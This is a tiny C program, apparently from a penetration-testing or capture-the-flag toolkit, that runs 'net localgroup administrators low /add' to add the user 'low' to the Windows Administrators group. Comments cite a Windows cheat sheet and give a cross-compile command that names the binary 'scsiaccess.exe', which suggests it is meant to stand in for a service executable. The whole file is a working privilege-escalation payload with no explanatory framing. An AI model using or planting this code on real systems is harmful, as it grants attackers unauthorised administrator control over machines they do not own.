#include <stdlib.h> /* system, NULL, EXIT_FAILURE */
int main ()
{
int i;
i=system ("net localgroup administrators low /add");
return 0;
}

//https://raw.githubusercontent.com/OlivierLaflamme/Cheatsheet-God/master/Cheatsheet_Windows.txt
//i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
